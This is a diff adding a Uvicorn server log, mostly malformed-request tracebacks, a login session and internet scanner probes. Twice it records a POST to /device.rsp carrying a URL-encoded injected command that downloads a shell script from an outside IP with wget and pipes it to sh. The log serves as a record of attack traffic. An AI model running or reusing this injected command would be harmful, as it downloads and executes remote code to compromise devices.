@@ -1,0 +1,1199 @@
+/root/s33_project/venv/lib64/python3.6/site-packages/jose/backends/cryptography_backend.py:4: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography. The next release of cryptography will remove support for Python 3.6.
+  from cryptography.exceptions import InvalidSignature, InvalidTag
+INFO:     Started server process [31181]
+INFO:     Waiting for application startup.
+INFO:     Application startup complete.
+INFO:     Uvicorn running on http://0.0.0.0:8000 (Press CTRL+C to quit)
+INFO:     41.142.113.251:50693 - "GET /login HTTP/1.1" 200 OK
+INFO:     41.142.113.251:50693 - "GET /login HTTP/1.1" 200 OK
+INFO:     41.142.113.251:50693 - "GET /login HTTP/1.1" 200 OK
+INFO:     41.142.113.251:42668 - "POST /login HTTP/1.1" 302 Found
+INFO:     41.142.113.251:42668 - "GET /admin/dashboard HTTP/1.1" 200 OK
+INFO:     41.142.113.251:50696 - "GET /logout HTTP/1.1" 302 Found
+INFO:     41.142.113.251:50696 - "GET /login HTTP/1.1" 200 OK
+INFO:     139.162.145.153:45520 - "GET / HTTP/1.1" 200 OK
+INFO:     41.142.113.251:43883 - "GET /docs HTTP/1.1" 200 OK
+INFO:     41.142.113.251:43883 - "GET /openapi.json HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     152.42.188.73:54404 - "GET /cdn-cgi/trace HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "httptools/parser/parser.pyx", line 258, in httptools.parser.parser.cb_on_url
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 194, in on_url
+    parsed_url = httptools.parse_url(url)
+  File "httptools/parser/url_parser.pyx", line 105, in httptools.parser.url_parser.parse_url
+httptools.parser.errors.HttpParserInvalidURLError: invalid url b'example.com:443'
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserCallbackError: `on_url` callback error
+INFO:     3.131.215.38:38226 - "GET / HTTP/1.1" 200 OK
+INFO:     3.131.215.38:56616 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     85.84.136.168:53977 - "GET / HTTP/1.0" 200 OK
+INFO:     64.62.197.122:59172 - "GET / HTTP/1.1" 200 OK
+INFO:     64.62.197.135:19667 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     64.62.197.131:18179 - "GET /?format=json HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "httptools/parser/parser.pyx", line 258, in httptools.parser.parser.cb_on_url
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 194, in on_url
+    parsed_url = httptools.parse_url(url)
+  File "httptools/parser/url_parser.pyx", line 105, in httptools.parser.url_parser.parse_url
+httptools.parser.errors.HttpParserInvalidURLError: invalid url b'www.shadowserver.org:443'
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserCallbackError: `on_url` callback error
+INFO:     172.235.173.150:58168 - "GET / HTTP/1.0" 200 OK
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     172.235.173.150:58188 - "GET /nice%20ports%2C/Trinity.txt.bak HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     172.235.173.150:58208 - "OPTIONS / HTTP/1.0" 405 Method Not Allowed
+INFO:     172.235.173.150:58212 - "OPTIONS / HTTP/1.0" 405 Method Not Allowed
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidURLError: Unexpected char in url schema
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     172.235.173.150:58330 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     172.235.173.150:58356 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     172.235.173.150:58372 - "GET /webui HTTP/1.1" 404 Not Found
+INFO:     172.235.173.150:58376 - "GET / HTTP/1.1" 200 OK
+INFO:     172.235.173.150:58388 - "GET / HTTP/1.1" 200 OK
+INFO:     172.235.173.150:58410 - "GET /owa/ HTTP/1.1" 404 Not Found
+INFO:     172.235.173.150:58424 - "GET /owa/ HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     172.235.173.150:38732 - "GET / HTTP/1.1" 200 OK
+INFO:     124.198.131.145:58812 - "GET / HTTP/1.1" 200 OK
+INFO:     159.223.205.48:59818 - "GET / HTTP/1.1" 200 OK
+INFO:     159.223.205.48:59824 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     205.210.31.70:63436 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     143.244.190.162:53956 - "GET / HTTP/1.1" 200 OK
+INFO:     143.244.190.162:53958 - "GET /login HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "httptools/parser/parser.pyx", line 258, in httptools.parser.parser.cb_on_url
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 194, in on_url
+    parsed_url = httptools.parse_url(url)
+  File "httptools/parser/url_parser.pyx", line 105, in httptools.parser.url_parser.parse_url
+httptools.parser.errors.HttpParserInvalidURLError: invalid url b'google.com:443'
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserCallbackError: `on_url` callback error
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     68.183.196.125:43142 - "GET / HTTP/1.1" 200 OK
+INFO:     68.183.196.125:40526 - "GET /login HTTP/1.1" 200 OK
+INFO:     172.236.228.202:40900 - "GET / HTTP/1.1" 200 OK
+INFO:     138.197.16.14:55882 - "POST /api/client/update?arch=amd64&commit=08059e95dacafe0bf6e5782f8e2c8ec9cd8c5a17&os=windows HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "httptools/parser/parser.pyx", line 258, in httptools.parser.parser.cb_on_url
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 194, in on_url
+    parsed_url = httptools.parse_url(url)
+  File "httptools/parser/url_parser.pyx", line 105, in httptools.parser.url_parser.parse_url
+httptools.parser.errors.HttpParserInvalidURLError: invalid url b'example.com:443'
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserCallbackError: `on_url` callback error
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     152.42.188.73:54336 - "GET /cdn-cgi/trace HTTP/1.1" 404 Not Found
+INFO:     205.210.31.232:64704 - "GET / HTTP/1.1" 200 OK
+INFO:     206.168.34.213:40812 - "GET / HTTP/1.1" 200 OK
+INFO:     206.168.34.213:34810 - "GET / HTTP/1.1" 200 OK
+INFO:     206.168.34.213:34832 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserError: Pause on PRI/Upgrade
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserError: Pause on PRI/Upgrade
+INFO:     206.168.34.213:60454 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     206.168.34.213:60500 - "GET /login HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     147.185.132.16:60310 - "GET / HTTP/1.1" 200 OK
+INFO:     134.209.119.65:43238 - "GET / HTTP/1.1" 200 OK
+INFO:     134.209.119.65:43254 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     3.132.23.201:36628 - "GET / HTTP/1.1" 200 OK
+INFO:     3.132.23.201:53284 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     205.210.31.198:63150 - "GET / HTTP/1.1" 200 OK
+INFO:     192.159.99.101:50418 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidURLError: Unexpected char in url schema
+INFO:     192.159.99.101:46726 - "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=wget%20http%3A%2F%2F45.125.66.56%2Ftbk.sh%20-O-%20%7C%20sh HTTP/1.1" 404 Not Found
+INFO:     192.159.99.101:46740 - "GET / HTTP/1.0" 200 OK
+INFO:     192.159.99.101:46746 - "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidURLError: Unexpected char in url schema
+INFO:     192.159.99.101:46768 - "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=wget%20http%3A%2F%2F45.125.66.56%2Ftbk.sh%20-O-%20%7C%20sh HTTP/1.1" 404 Not Found
+INFO:     192.159.99.101:46778 - "GET / HTTP/1.0" 200 OK
+INFO:     192.159.99.101:46788 - "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     198.235.24.217:65082 - "GET / HTTP/1.1" 200 OK
+INFO:     185.247.137.183:46275 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     209.38.19.162:53424 - "GET / HTTP/1.1" 200 OK
+INFO:     209.38.19.162:53428 - "GET /login HTTP/1.1" 200 OK
+INFO:     45.156.129.105:47073 - "GET / HTTP/1.1" 200 OK
+INFO:     45.156.129.106:59567 - "GET /ext-js/app/common/zld_product_spec.js HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     45.156.129.105:56563 - "GET /api/session/properties HTTP/1.1" 404 Not Found
+INFO:     45.156.129.108:37031 - "GET /console HTTP/1.1" 404 Not Found
+INFO:     45.156.129.108:56537 - "GET / HTTP/1.1" 200 OK
+INFO:     45.156.129.105:51355 - "GET /owncloud/status.php HTTP/1.1" 404 Not Found
+INFO:     45.156.129.108:44277 - "GET /status.php HTTP/1.1" 404 Not Found
+INFO:     45.156.129.107:48687 - "GET / HTTP/1.1" 200 OK
+INFO:     45.156.129.108:54741 - "GET /admin/ HTTP/1.1" 404 Not Found
+INFO:     45.156.129.106:40879 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     45.156.129.108:42893 - "GET /helpdesk/WebObjects/Helpdesk.woa HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     64.62.156.94:17206 - "GET / HTTP/1.1" 200 OK
+INFO:     64.62.156.97:36009 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     64.62.156.97:59937 - "GET /?format=json HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "httptools/parser/parser.pyx", line 258, in httptools.parser.parser.cb_on_url
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 194, in on_url
+    parsed_url = httptools.parse_url(url)
+  File "httptools/parser/url_parser.pyx", line 105, in httptools.parser.url_parser.parse_url
+httptools.parser.errors.HttpParserInvalidURLError: invalid url b'www.shadowserver.org:443'
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserCallbackError: `on_url` callback error
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/root/s33_project/venv/lib64/python3.6/site-packages/uvicorn/protocols/http/httptools_impl.py", line 132, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     41.142.126.155:23849 - "GET / HTTP/1.1" 200 OK
+INFO:     41.142.126.155:50298 - "GET /robots.txt?488410 HTTP/1.1" 404 Not Found
